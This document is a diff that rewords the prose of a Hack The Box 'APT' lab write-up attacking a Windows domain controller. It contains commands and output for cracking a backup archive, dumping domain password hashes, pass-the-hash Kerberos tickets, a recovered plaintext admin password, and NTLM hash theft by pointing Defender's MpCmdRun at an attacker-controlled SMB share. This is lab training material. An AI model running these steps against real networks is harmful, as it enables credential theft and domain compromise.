@@ -6,14 +6,14 @@ points: 50
 rating: 3.7
 date: 2020-10-31
 avatar: assets/htb/apt.png
-source: https://github.com/zweilosec/htb-writeups (MIT)
 htb_url: https://app.hackthebox.com/machines/APT
 ---
+
 ## Enumeration
 
 ### Nmap scan
 
-I started my enumeration with an nmap scan of `<YOUR_IP>`. The options I regularly use are: `-p-`, which is a shortcut which tells nmap to scan all ports, `-sC` is the equivalent to `--script=default` and runs a collection of nmap enumeration scripts against the target, `-sV` does a service scan, and `-oA <name>` saves all types of output \(.nmap,.gnmap, and .xml\) with filenames of `<name>`.
+I kicked things off with an nmap scan against `<YOUR_IP>`. My usual flags are: `-p-` to cover every port, `-sC` (same as `--script=default`) to fire the default enumeration scripts at the host, `-sV` for service detection, and `-oA <name>` to dump all three output formats \(.nmap, .gnmap, and .xml\) under the name `<name>`.
 
 ```text
 ┌──(kac0㉿kali)-[~/htb/apt]
@@ -33,27 +33,27 @@ Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
 Nmap done: 1 IP address (1 host up) scanned in 132.93 seconds
 ```
 
-Only two ports open, 80 - HTTP \(IIS\) and 135 - RPC
+Just two ports were exposed: 80 - HTTP \(IIS\) and 135 - RPC
 
 ### Port 80 - HTTP
 
-found email sales@gigantichosting.com, phone \(818\) 995-1560
+Picked up an email sales@gigantichosting.com and a phone number \(818\) 995-1560
 
 ```text
 <!-- Mirrored from 10.13.38.16/ by HTTrack Website Copier/3.x [XR&CO'2014], Mon, 23 Dec 2019 08:12:54 GMT -->
 ```
 
-In source code saw IP mentioned `10.13.38.16/` also HTTrack Website Copier/3.x
+The page source referenced the IP `10.13.38.16/` along with HTTrack Website Copier/3.x
 
 * [https://seclists.org/fulldisclosure/2017/May/89](https://seclists.org/fulldisclosure/2017/May/89)
 * [https://packetstormsecurity.com/files/131160/HTTrack-Website-Copier-3.48-21-DLL-Hijacking.html](https://packetstormsecurity.com/files/131160/HTTrack-Website-Copier-3.48-21-DLL-Hijacking.html)
 * [https://en.kali.tools/?p=443&PageSpeed=noscript](https://en.kali.tools/?p=443&PageSpeed=noscript)
 
-Most of the pages on the site did not contain anything useful or interesting. The `/support` page had a contact form that I tried some XSS and SQLi
+Nearly every page was empty of anything worthwhile. The `/support` page hosted a contact form, so I threw some XSS and SQLi at it.
 
-submitting the form redirected me to the IP I had seen that the site had been copied from \(10.13.38.16\). Burp also failed to connect
+After submitting, the form bounced me to the IP the site had been cloned from \(10.13.38.16\). Burp couldn't connect either.
 
-I also could not ping that IP. This was not the way.
+That IP wasn't pingable from my end. Dead end.
 
 ### Port 1135 - RPC
 
@@ -63,13 +63,13 @@ I also could not ping that IP. This was not the way.
 Cannot connect to server.  Error was NT_STATUS_CONNECTION_DISCONNECTED
 ```
 
-I wasn't able to connect to the machine with RPC client. I seemed to have hit a dead end
+rpcclient refused to connect, so I was stuck again.
 
-searched for how to enumerate RPC without authentication
+I went looking for ways to enumerate RPC without credentials.
 
 * [https://airbus-cyber-security.com/the-oxid-resolver-part-1-remote-enumeration-of-network-interfaces-without-any-authentication/](https://airbus-cyber-security.com/the-oxid-resolver-part-1-remote-enumeration-of-network-interfaces-without-any-authentication/)
 
-From a windows machine you could possibly use
+On a Windows host you might instead use
 
 * [https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-R2-and-2012/hh875578\(v=ws.11](https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-R2-and-2012/hh875578%28v=ws.11)\)
 
@@ -122,7 +122,7 @@ if __name__ == "__main__":
    main(sys.argv[1:])
 ```
 
-I copied the PoC from the site and modified the script to scan the IP of my target.
+I grabbed the PoC from the article and tweaked the script to point at my target's IP.
 
 ```text
 ┌──(kac0㉿kali)-[~/htb/apt]
@@ -134,7 +134,7 @@ Address: dead:beef::b885:d62a:d679:573f
 Address: dead:beef::4d93:3f31:7ea4:6f57
 ```
 
-After running it, I was presented with the hostname \(I assume\), the IPv4 address, and two IP46 addresses
+Running it returned what I take to be the hostname, the IPv4 address, and a pair of IPv6 addresses
 
 ```text
 ┌──(kac0㉿kali)-[~/htb/apt]
@@ -148,7 +148,7 @@ PING dead:beef::b885:d62a:d679:573f(dead:beef::b885:d62a:d679:573f) 56 data byte
 rtt min/avg/max/mdev = 65.438/66.913/68.389/1.475 ms
 ```
 
-I was able to ping using the IP6 address. The TTL of 64 was a bit odd, not sure if that is normal for IPv6. It showed 127 like normal when pinging the IPv4 address.
+The IPv6 address responded to ping. The TTL of 64 seemed off to me; not sure whether that's typical for IPv6. Pinging the IPv4 address gave the usual 127.
 
 ```text
 ┌──(kac0㉿kali)-[~/htb/apt]
@@ -156,7 +156,7 @@ I was able to ping using the IP6 address. The TTL of 64 was a bit odd, not sure 
 rpcclient $>
 ```
 
-Using this IPv6 address I was able to connect using rpcclient
+Pointing rpcclient at that IPv6 address let me connect
 
 ```text
 rpcclient $> lsaquery
@@ -168,13 +168,13 @@ rpcclient $> srvinfo
         server type     :       0x80102b
 ```
 
-After getting `NT_STATUS_ACCESS_DENIED` for all of my commands I was starting to think I wasn't going to get anything, but finnaly one command returned something. I got the hostname of `APT.HTB`
+Every command kept throwing `NT_STATUS_ACCESS_DENIED`, and I figured I'd come up empty until one finally gave me output. It revealed the hostname `APT.HTB`
 
-I went through a lot of the other commands, but wasn't able to get anything else out of this.
+I worked through plenty of the remaining commands but couldn't squeeze anything more out of it.
 
 ### nmap - IPv6
 
-this scan came up with a lot more open ports
+scanning over IPv6 turned up many more open ports
 
 ```
 PORT      STATE SERVICE      REASON  VERSION
@@ -211,16 +211,16 @@ PORT      STATE SERVICE      REASON  VERSION
 49687/tcp open  msrpc        syn-ack Microsoft Windows RPC
 ```
 
-This time I was able to see many more ports open.  This was looking like a real Windows server now
+A whole lot more ports showed up this time. Now it actually looked like a proper Windows server
 
 https://www.ethicalhackx.com/how-to-pwn-on-ipv6/
 `[dead:beef::b885:d62a:d679:573f]`
 
-I searched for a way to enumerate Windows using ipv6 and found a newer version of a popular tool, enum4linux, that supported ipv6
+Looking for a way to enumerate Windows over IPv6, I came across an updated build of the well-known enum4linux tool that handles IPv6
 
 * https://hacker-gadgets.com/blog/2020/12/04/enum4linux-ng-a-next-generation-version-of-enum4linux-a-windows-samba-enumeration-tool-with-additional-features-like-json-yaml-export/
 
-Using the information from this tool, I learned how to search using smbclient with ipv6
+What the tool showed me taught me how to query smbclient over IPv6
 
 ```
 ┌──(kac0㉿kali)-[~/htb/apt/enum4linux-ng]
@@ -235,7 +235,7 @@ Using the information from this tool, I learned how to search using smbclient wi
 dead:beef::b885:d62a:d679:573f is an IPv6 address -- no workgroup available
 ```
 
-Was able to enumerate shares using smbclient.  the backup share looked interesting
+smbclient listed the shares for me, and the backup share stood out
 
 ```
 ┌──(kac0㉿kali)-[~/htb/apt/enum4linux-ng]
@@ -251,7 +251,7 @@ smb: \> get backup.zip
 getting file \backup.zip of size 10650961 as backup.zip (5794.6 KiloBytes/sec) (average 5794.6 KiloBytes/sec)
 ```
 
-Inside the `backup` share I found a backup.zip and extracted it to my computer
+The `backup` share held a backup.zip, which I pulled down to my box
 
 ```
 ┌──(kac0㉿kali)-[~/htb/apt]
@@ -266,7 +266,7 @@ Archive:  backup.zip
    skipping: registry/SYSTEM         incorrect password
 ```
 
-The zip file was password-protected, but not encrypted.  This was a very juicy find, indeed.  If I could extract these files, I could potentially get the password hashes of all of the domain users on this machine
+The archive was password-protected though not encrypted. A very juicy find indeed. Cracking it open could net me the password hashes for every domain user on the box
 
 ```
 ┌──(kac0㉿kali)-[~/htb/apt]
@@ -283,7 +283,7 @@ If that is not the case, the hash may be uncrackable. To avoid this, use
 option -o to pick a file at a time.
 ```
 
-next I used `zip2john` to extract the password hash
+I then ran `zip2john` to pull out the password hash
 
 ```
 ┌──(kac0㉿kali)-[~/htb/apt]
@@ -298,7 +298,7 @@ Use the "--show" option to display all of the cracked passwords reliably
 Session completed
 ```
 
-Then I loaded the hash into John.  It cracked in less than a second. The password was `iloveyousomuch`
+Feeding the hash to John, it fell in under a second. The password was `iloveyousomuch`
 
 ```
 ┌──(kac0㉿kali)-[~/htb/apt]
@@ -311,7 +311,7 @@ Archive:  backup.zip
   inflating: registry/SYSTEM
 ```
 
-Using this password I was able to successfully extract all of the files
+With that password the files all extracted cleanly
 
 ```
 ┌──(kac0㉿kali)-[~/htb/apt]
@@ -352,7 +352,7 @@ APT$:CLEARTEXT:4[%fo'zG`&BhR3cP[)U2NVS\LEYO/&^)<9xj6%#9\\?uJ4YPb`DRK" IES2fXK"f,
 [*] Cleaning up...
 ```
 
-There were hundreds of users on this domain!  Luckily there were a couple of plaintext passwords
+The domain had hundreds of users! Conveniently, a couple of plaintext passwords were in there too
 
 ```
 ┌──(kac0㉿kali)-[~/htb/apt]
@@ -363,7 +363,7 @@ There were hundreds of users on this domain!  Luckily there were a couple of pla
 7996 users
 ```
 
-I was wrong...there were almost 8000 users!!
+Scratch that...it was closer to 8000 users!!
 
 ```
 ┌──(kac0㉿kali)-[~/htb/apt]
@@ -374,7 +374,7 @@ I was wrong...there were almost 8000 users!!
 2004 users
 ```
 
-After looking in it a bit, I noticed there were duplicates.  After sorting and pulling out the unique entries there were only...2000 or so left.  Much more manageable, but a lot to go through still.
+Looking closer, the list had duplicates. Once I sorted and deduplicated it, only around 2000 remained. Far more manageable, but still a big list to chew through.
 
 ```
 ┌──(kac0㉿kali)-[~/htb/apt]
@@ -397,21 +397,21 @@ Version: v1.0.3 (9dad6e1) - 03/29/21 - Ronnie Flathers @ropnop
 2021/03/29 22:12:34 >  Done! Tested 2004 usernames (3 valid) in 1159.740 seconds
 ```
 
-Using kerbrute I was able to find 3 valid users out of 2000+
+kerbrute narrowed the 2000+ down to 3 valid users
 
 ```
 ┌──(kac0㉿kali)-[~/htb/apt]
 └─$ awk -F":" '{print $3,$4}' ntds.dump | sed 's/ /:/g' > nt_hashes
 ```
 
-Now I needed to find a valid hash. I put all of the hashes in a file by themselves
+Next I had to identify a valid hash, so I dropped all the hashes into their own file
 
 ```
 ┌──(kac0㉿kali)-[~/htb/apt]
 └─$ crackmapexec smb apt.htb.local -u henry.vinson -H nt_hashes -d htb
 ```
 
-I tried using crackmapexec but it did not come up with any results (not sure if it even did anything...)
+crackmapexec gave me nothing back (I'm not even sure it ran...)
 
 ```
 ┌──(kac0㉿kali)-[~/htb/apt]
@@ -421,7 +421,7 @@ Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation
 Kerberos SessionError: KDC_ERR_PREAUTH_FAILED(Pre-authentication information was invalid)
 ```
 
-Using GetTGT.py from impacket I was able to check one hash, but there was no way to validate all of the hashes at one time
+Impacket's GetTGT.py let me test a single hash, but there was no built-in way to validate them all at once
 
 ```
 ┌──(kac0㉿kali)-[~/htb/apt]
@@ -431,7 +431,7 @@ Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation
 not enough values to unpack (expected 2, got 1)
 ```
 
-I used some bash magic to run the same command for each line in my `nt_hashes` file.  It started giving a bunch of errors for all of the lines that didn't have both halves of the hash (this script from Impacket expects both halves)
+A bit of bash looped that command over every line in `nt_hashes`. It spat out errors for any line missing both halves of the hash, since this Impacket script requires both parts
 
 ```
 ┌──(kac0㉿kali)-[~/htb/apt]
@@ -441,13 +441,13 @@ Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation
 Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)
 ```
 
-I pulled out one of the hashes and tried it with just one that was in the right format, but this time I got an error that said my clock was too far off the DC
+I isolated one properly formatted hash and ran it alone, but now the error complained that my clock was too far out of sync with the DC
 
 * https://book.hacktricks.xyz/windows/active-directory-methodology/kerberoast
 
 > If you find this error from Linux: `Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)` it because of your local time, you need to synchronise the host with the DC: ntpdate `<IP of DC>`
 
-I had to install `ntpdate`
+I needed to install `ntpdate`
 
 ```
 ┌──(kac0㉿kali)-[~/htb/apt]
@@ -455,7 +455,7 @@ I had to install `ntpdate`
 29 Mar 23:07:02 ntpdate[794852]: no server suitable for synchronization found
 ```
 
-After playing with my system time, I realized that it never jumped forwards for daylight savings time...
+Messing with the system clock, I realized it had never sprung forward for daylight savings...
 
 ```
 ┌──(kac0㉿kali)-[~/htb/apt]
@@ -463,18 +463,18 @@ After playing with my system time, I realized that it never jumped forwards for 
 29 Mar 23:14:48 ntpdate[842178]: step time server 194.36.144.87 offset -3599.289748 sec
 ```
 
-I simply synced it with a known good ntp server (Note: I realised that I had to change my system clock for another HTB machine in the past (find name and link) so this was just reverting it...)
+So I just synced against a trusted ntp server (Note: I remembered I'd previously adjusted my clock for another HTB box (find name and link), so this was really just undoing that...)
 
 ```
 ┌──(kac0㉿kali)-[~/htb/apt]
 └─$ date
 Tue 30 Mar 2021 12:17:39 AM EDT
 ```
-I still had the same problem... my VM reported one time, but the terminal reported another... the date command was way off for some reason
+The problem persisted... my VM showed one time while the terminal showed another, and `date` was wildly off for whatever reason
 
 https://github.com/byt3bl33d3r/CrackMapExec/issues/339
 
-The next day, it was magicly working. I didn't restart the system or anything (I had actually only paused the vm)
+The following day it just worked. I hadn't rebooted at all (I'd only paused the VM)
 
 ```
 ┌──(kac0㉿kali)-[~/htb/apt]
@@ -485,7 +485,7 @@ Kerberos SessionError: KDC_ERR_PREAUTH_FAILED(Pre-authentication information was
 Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation
 ```
 
-This time I was able to enumerate the users (or at least was able to connect and get the PREAUTH_FAILED error).  
+This time the enumeration went through (or at least it connected and returned the PREAUTH_FAILED error).  
 
 ```
 ┌──(kac0㉿kali)-[~/htb/apt]
@@ -494,7 +494,7 @@ This time I was able to enumerate the users (or at least was able to connect and
 Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)
 ```
 
-I used a bit of bash hackery to remove the results that showed failed attempts and let it run.  (I assumed it would take a long time so I let it go and got dinner)
+More bash trickery filtered out the failed attempts, and I left it running. (Figuring it would take a while, I went and got dinner)
 
 ** this is the way **
 *  https://github.com/byt3bl33d3r/CrackMapExec/issues/339
@@ -503,7 +503,7 @@ I used a bit of bash hackery to remove the results that showed failed attempts a
 └─$ sudo ssh kac0@127.0.0.1 -L 445:apt.htb.local:445
 ```
 
-I had to enable ssh on my machine, then do port forwarding.  
+I enabled ssh locally and then set up port forwarding.  
 
 ```
 ┌──(kac0㉿kali)-[~/htb/apt]
@@ -516,7 +516,7 @@ SMB         ::1             445    APT              [*] Windows Server 2016 Stan
 
 ** this is not the way**
 
-but other than getting the windows version information, I could not get this to connect afterwards
+but aside from the Windows version banner, I couldn't get it to connect any further
 
 ```
 ┌──(kac0㉿kali)-[~/htb/apt]
@@ -595,13 +595,13 @@ SMB         ::1             445    APT              [*] Windows Server 2016 Stan
 DEBUG Stopped thread poller
 ```
 
-If someone could tell me what I was doing wrong I would greatly appreciate it!!
+If anyone can point out what I got wrong here, I'd really appreciate it!!
 
 # getTGT way (cont)
 
 * https://www.onsecurity.io/blog/abusing-kerberos-from-linux/
 
-STill got time sync error, but this time only for one hash; all others reported PREAUTH error
+Still hit a time sync error, but only on one hash this time; the rest returned the PREAUTH error
 
 ```
 ┌──(kac0㉿kali)-[~/htb/apt]
@@ -610,7 +610,7 @@ Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)
 aad3b435b51404eeaad3b435b51404ee:e53d87d42adaa3ca32bdb34a876cbffb
 ```
 
-couldn't resolve time sync errors...
+still couldn't shake the time sync errors...
 
 ```
 ┌──(kac0㉿kali)-[~/htb/apt]
@@ -629,7 +629,7 @@ Tue Mar 30 21:38:19 2021
 Tue 30 Mar 2021 09:28:35 PM EDT
 ```
 
-my errors were caused because the time was 10 minutes off...Thank you `net time`!!
+the errors came down to my clock being 10 minutes out...Thanks, `net time`!!
 
 ```
 ┌──(kac0㉿kali)-[~/htb/apt]
@@ -638,7 +638,7 @@ my errors were caused because the time was 10 minutes off...Thank you `net time`
 [*] Saving ticket in henry.vinson@apt.htb.ccache
 ```
 
-And it worked!!
+And that did the trick!!
 
 ### push on
 
@@ -653,7 +653,7 @@ Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation
 [-] share 'SYSVOL' is not writable.
 ```
 
-The hash seemed to be valid! I got a listing of shares, though it wouldnt connect since they werent writeable
+The hash looked valid! It listed the shares, but wouldn't connect because none were writable
 
 ```
 ┌──(kac0㉿kali)-[~/htb/apt]
@@ -664,7 +664,7 @@ Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation
 [-] rpc_s_access_denied
 ```
 
-denied using wmiexec.py
+wmiexec.py was denied
 
 ```
 ┌──(kac0㉿kali)-[~/htb/apt]
@@ -674,7 +674,7 @@ Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation
 [-] DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied
 ```
 
-I was starting to think that the hash was not valid, though it did enumerate shares...
+I began to doubt the hash was valid, even though it had enumerated shares...
 
 ```
 ┌──(kac0㉿kali)-[~/htb/apt]
@@ -685,7 +685,7 @@ Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation
 [-] rpc_s_access_denied
 ```
 
-I kept going down the list of impacket tools that were relevant
+I kept working through the relevant impacket tools one by one
 
 https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/reg-query
 
@@ -698,7 +698,7 @@ Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation
 [-] SMB SessionError: STATUS_ACCESS_DENIED({Access Denied} A process has requested access to an object but has not been granted those access rights.)
 ```
 
-nothing seemed to work.  I tried each of these using the -k option after exporting the key to KRB5CCNAME and still couldnt progress
+nothing worked. I retried each one with the -k option after exporting the ticket to KRB5CCNAME and still got nowhere
 
 ```
 ┌──(kac0㉿kali)-[~/htb/apt]
@@ -713,7 +713,7 @@ Valid starting       Expires              Service principal
 
 * https://0xeb-bp.com/blog/2019/11/21/practical-guide-pass-the-ticket.html
 
-So the ticket was expired.
+Turns out the ticket had expired.
 
 ```
 ┌──(kac0㉿kali)-[~/htb/apt]
@@ -731,9 +731,9 @@ Valid starting       Expires              Service principal
      renew until 04/01/2021 20:15:12
 ```
 
-I ran my one-liner from earlier (on just the valid hash!) and the time was refreshed
+Rerunning my earlier one-liner (against just the valid hash!) refreshed the timestamp
 
-I tried dumping the registry, and this time it took much, much, longer to output (like everything else on this machine so far!).  I was sure that it was working this time!!  I used the `-s` reg option to make it recursively get all keys.  I chose HKEY-USER first since it was a likely place to find potential credentials and other useful system information.  
+I went after the registry again, and this time the output took far, far longer to come back (just like everything else on this box!). That convinced me it was finally working. I added the `-s` reg flag to recurse through every key, and started with HKEY-USER since it's a good spot for credentials and other handy system details.  
 
 * https://www.lifewire.com/hkey-users-2625903
 
@@ -749,7 +749,7 @@ Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation
 [-] DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied
 ```
 
-Next I tried to download HKLM while I perused through HKU, but I was denied access.
+While browsing HKU, I tried grabbing HKLM as well, but access was denied.
 
 ```
 \Software\Microsoft\Windows\CurrentVersion\Explorer\SearchPlatform\Preferences\
@@ -762,7 +762,7 @@ Next I tried to download HKLM while I perused through HKU, but I was denied acce
         IEAddressBarSearchDefault       REG_SZ   MSNSearch
 ```
 
-Apparently this user never uses this machine, since their default search was MSN...There surprisingly was actually not that much information in this registry dump
+This user clearly never touches the machine, given their default search engine was still MSN...Surprisingly, the registry dump didn't hold much information at all
 
 ```
 \Software\Microsoft\Windows\CurrentVersion\Group Policy\GroupMembership\
@@ -780,7 +780,7 @@ Apparently this user never uses this machine, since their default search was MSN
         Count   REG_DWORD        0xb
 ```
 
-The group policy key gave a listing of the groups that this user was a part of.  I could use this to look up the well known groups by their SID.
+The group policy key spelled out which groups this user belonged to. I could resolve the well-known groups from their SIDs.
 
 ```
 \Volatile Environment\
@@ -799,7 +799,7 @@ The group policy key gave a listing of the groups that this user was a part of. 
         CLIENTNAME      REG_SZ
 ```
 
-I reached the end of the file and found some minorly useful information.  I started doing some searches to see if I missed something
+By the end of the file I'd only found marginally useful info, so I started grepping around to see what I'd overlooked
 
 ### Finding user creds
 
@@ -809,7 +809,7 @@ I reached the end of the file and found some minorly useful information.  I star
         PassWord        REG_SZ   G1#Ny5@2dvht
 ```
 
-Searching for `Password` yeilded something that I had scrolled right past in my first look through.  There was a username and password `henry.vinson_adm:G1#Ny5@2dvht`
+Grepping for `Password` surfaced something I'd scrolled straight past the first time: a username and password pair `henry.vinson_adm:G1#Ny5@2dvht`
 
 ## Initial Foothold
 
@@ -821,7 +821,7 @@ Evil-WinRM shell v2.3
 
 Info: Establishing connection to remote endpoint
 
-[0;31m*Evil-WinRM*[0m[0;1;33m PS [0mC:\Users\henry.vinson_adm\Documents> whoami /all
+*Evil-WinRM* PS C:\Users\henry.vinson_adm\Documents> whoami /all
 
 USER INFORMATION
 ----------------
@@ -862,13 +862,13 @@ User claims unknown.
 Kerberos support for Dynamic Access Control on this device has been disabled.
 ```
 
-After all that, I finally had a shell!  There were no useful or interesting groups or privileges (adding a machine to the domain would be very useful in other situations though! I should have tried it anyway...).
+After all that effort, I finally landed a shell! There weren't any noteworthy groups or privileges (although being able to add a machine to the domain can be very handy elsewhere; I should have tried it anyway...).
 
 ### User.txt
 
 ```
-[0;31m*Evil-WinRM*[0m[0;1;33m PS [0mC:\Users\henry.vinson_adm\Documents> cd ../Desktop
-[0;31m*Evil-WinRM*[0m[0;1;33m PS [0mC:\Users\henry.vinson_adm\Desktop> ls
+*Evil-WinRM* PS C:\Users\henry.vinson_adm\Documents> cd ../Desktop
+*Evil-WinRM* PS C:\Users\henry.vinson_adm\Desktop> ls
 
     Directory: C:\Users\henry.vinson_adm\Desktop
 
@@ -876,22 +876,22 @@ Mode                LastWriteTime         Length Name
 ----                -------------         ------ ----
 -ar---        3/31/2021   3:46 PM             34 user.txt
 
-[0;31m*Evil-WinRM*[0m[0;1;33m PS [0mC:\Users\henry.vinson_adm\Desktop> type user.txt
+*Evil-WinRM* PS C:\Users\henry.vinson_adm\Desktop> type user.txt
 0be8************************a6ca
 ```
 
-I found the proof that I had made it inside, on the users Desktop
+The proof I'd gotten in was sitting on the user's Desktop
 
 ## Path to Power \(Gaining Administrator Access\)
 
 ### Enumeration as `henry.vinson_adm`
 
-none of the exe versions of winPEAS worked on this machine, so I had to run the .bat.  I was also denied running `systeminfo`
+None of the winPEAS .exe builds ran on this host, so I fell back to the .bat. I was also blocked from running `systeminfo`
 
-The .bat version seemed to be stuck on a loop, so I started poking around manually while I waited, in another shell
+The .bat seemed to hang in a loop, so I opened a second shell and started digging around by hand while it churned
 
 ```xml
-[0;31m*Evil-WinRM*[0m[0;1;33m PS [0mC:\Users\henry.vinson_adm\Desktop> type C:\Windows\Panther\unattend.xml 
+*Evil-WinRM* PS C:\Users\henry.vinson_adm\Desktop> type C:\Windows\Panther\unattend.xml 
 <?xml version='1.0' encoding='utf-8'?>
 <unattend xmlns="urn:schemas-microsoft-com:unattend">
    <settings pass="generalize" wasPassProcessed="true">
@@ -1005,33 +1005,33 @@ The .bat version seemed to be stuck on a loop, so I started poking around manual
 </unattend>
 ```
 
-The output had mentioned a few interesting files. The first I checked was C:\Windows\Panther\unattend.xml. These unattend files can often hold plaintext credentials. This administrator had been smart enough to remove his credentials afterwards.
+The output had pointed at a few files of interest. First up was C:\Windows\Panther\unattend.xml. Unattend files frequently leak plaintext credentials, but this admin had been careful enough to strip his out afterward.
 
 ```text
 (Get-NetAdapter | Disable-NetAdapterBinding -ComponentID ms_tcpip6 -confirm:$false)
 ```
 
-The base64 encoded command drew my attention. It looked as if this was used to disable ipv6?
+The base64-encoded command caught my eye. It appeared to be disabling IPv6?
 
 ```text
-[0;31m*Evil-WinRM*[0m[0;1;33m PS [0mC:\Users\henry.vinson_adm\Desktop> type C:\Users\henry.vinson_adm\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
+*Evil-WinRM* PS C:\Users\henry.vinson_adm\Desktop> type C:\Users\henry.vinson_adm\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
 $Cred = get-credential administrator
 invoke-command -credential $Cred -computername localhost -scriptblock {Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Lsa" lmcompatibilitylevel -Type DWORD -Value 2 -Force}
 ```
 
-The powershell history file contained something interesting. The administrator credentials had been used to run a scriptblock that set the value of a registry key
+The PowerShell history file held something noteworthy. The administrator account had been used to run a scriptblock that wrote a value to a registry key
 
 ```text
-[0;31m*Evil-WinRM*[0m[0;1;33m PS [0mC:\Users\henry.vinson_adm\Desktop> echo $Cred
+*Evil-WinRM* PS C:\Users\henry.vinson_adm\Desktop> echo $Cred
 ```
 
-Nope. didnt work. darn lol
+Nope, no luck there. Oh well lol
 
 * [https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/network-security-lan-manager-authentication-level](https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/network-security-lan-manager-authentication-level)
 * [https://itconnect.uw.edu/wares/msinf/other-help/lmcompatibilitylevel/ntlmv1-removal-known-problems-and-workarounds/](https://itconnect.uw.edu/wares/msinf/other-help/lmcompatibilitylevel/ntlmv1-removal-known-problems-and-workarounds/)
 * [https://book.hacktricks.xyz/windows/ntlm](https://book.hacktricks.xyz/windows/ntlm) 
 
-Some reasearch revealed that
+A bit of research turned up that
 
 > The Network security: LAN Manager authentication level setting determines which challenge/response authentication protocol is used for network logons. This choice affects the authentication protocol level that clients use, the session security level that the computers negotiate, and the authentication level that servers accept.
 
@@ -1039,9 +1039,9 @@ Some reasearch revealed that
 Send NTLM response only | Client devices use NTLMv1 authentication, and they use NTLMv2 session security if the server supports it. Domain controllers accept LM, NTLM, and NTLMv2 authentication. | 2
 ```
 
-A value of '2' meant that NTLM hashes would be sent
+Setting it to '2' meant the host would send NTLM hashes
 
-according to [https://book.hacktricks.xyz/windows/ntlm](https://book.hacktricks.xyz/windows/ntlm) I could abuse the print spooler service to get the machine to send the hash to my machine, where I could capture it with `responder`
+per [https://book.hacktricks.xyz/windows/ntlm](https://book.hacktricks.xyz/windows/ntlm), I could abuse the print spooler service to coerce the host into sending its hash to me, where `responder` would catch it
 
 ```text
 ┌──(kac0㉿kali)-[~/htb/apt]
@@ -1061,12 +1061,12 @@ according to [https://book.hacktricks.xyz/windows/ntlm](https://book.hacktricks.
 Example: 1122334455667788
 ```
 
-The instructions on this page are not as well written as a lot of others on this page, but at least responder gave a verbose enough error message to fix the problem
+These instructions weren't as clear as some others, but responder's error message was verbose enough to let me sort out the issue
 
 * [https://gbhackers.com/hackers-can-steal-windows-ntlm/](https://gbhackers.com/hackers-can-steal-windows-ntlm/)
 * [https://github.com/Gl3bGl4z/All\_NTLM\_leak](https://github.com/Gl3bGl4z/All_NTLM_leak)
 
-The github account was a good list of different ways to leak NTLM hashes I tried each one until I got one that wasn't henry
+That GitHub repo had a solid catalog of NTLM-leak techniques, and I worked through them until one returned a hash that wasn't henry's
 
 > Windows Defender MpCmdRun
 >
@@ -1078,14 +1078,14 @@ The github account was a good list of different ways to leak NTLM hashes I tried
 > 
 > Scans for malicious software. Values for ScanType are: 0 Default, according to your configuration, -1 Quick scan, -2 Full scan, -3 File and directory custom scan.
 
-remote share scanning? :\)
+scanning a remote share? :\)
 
 ```text
-[0;31m*Evil-WinRM*[0m[0;1;33m PS [0mC:\Users\henry.vinson_adm\Documents\test> cd "C:\ProgramData\Microsoft\Windows Defender\platform\4.18.2008.9-0\"
+*Evil-WinRM* PS C:\Users\henry.vinson_adm\Documents\test> cd "C:\ProgramData\Microsoft\Windows Defender\platform\4.18.2008.9-0\"
 Cannot find path 'C:\ProgramData\Microsoft\Windows Defender\platform\4.18.2008.9-0\' because it does not exist.
 
-[0;31m*Evil-WinRM*[0m[0;1;33m PS [0mC:\Users\henry.vinson_adm\Documents\test> cd "C:\ProgramData\Microsoft\Windows Defender\platform\"
-[0;31m*Evil-WinRM*[0m[0;1;33m PS [0mC:\ProgramData\Microsoft\Windows Defender\platform> ls
+*Evil-WinRM* PS C:\Users\henry.vinson_adm\Documents\test> cd "C:\ProgramData\Microsoft\Windows Defender\platform\"
+*Evil-WinRM* PS C:\ProgramData\Microsoft\Windows Defender\platform> ls
 
     Directory: C:\ProgramData\Microsoft\Windows Defender\platform
 
@@ -1095,13 +1095,13 @@ d-----       11/10/2020  11:09 AM                4.18.2010.7-0
 d-----        3/17/2021   3:13 PM                4.18.2102.4-0
 ```
 
-The example on the page did not work, but I found two newer versions in the `/platform` folder. I hoped that one would still be vulnerable to this issue
+The path in the example didn't exist, but the `/platform` folder held two newer versions. I was hoping one of them was still affected by this bug
 
 ```text
-[0;31m*Evil-WinRM*[0m[0;1;33m PS [0mC:\ProgramData\Microsoft\Windows Defender\platform\4.18.2010.7-0> ./MpCmdRun.exe -Scan -ScanType 3 -file \\10.10.14.187\test
+*Evil-WinRM* PS C:\ProgramData\Microsoft\Windows Defender\platform\4.18.2010.7-0> ./MpCmdRun.exe -Scan -ScanType 3 -file \\10.10.14.187\test
 Scan starting...
 CmdTool: Failed with hr = 0x80508023. Check C:\Users\HENRY~2.VIN\AppData\Local\Temp\MpCmdRun.log for more information
-[0;31m*Evil-WinRM*[0m[0;1;33m PS [0mC:\ProgramData\Microsoft\Windows Defender\platform\4.18.2010.7-0> type C:\Users\HENRY~2.VIN\AppData\Local\Temp\MpCmdRun.log
+*Evil-WinRM* PS C:\ProgramData\Microsoft\Windows Defender\platform\4.18.2010.7-0> type C:\Users\HENRY~2.VIN\AppData\Local\Temp\MpCmdRun.log
 -------------------------------------------------------------------------------------
 
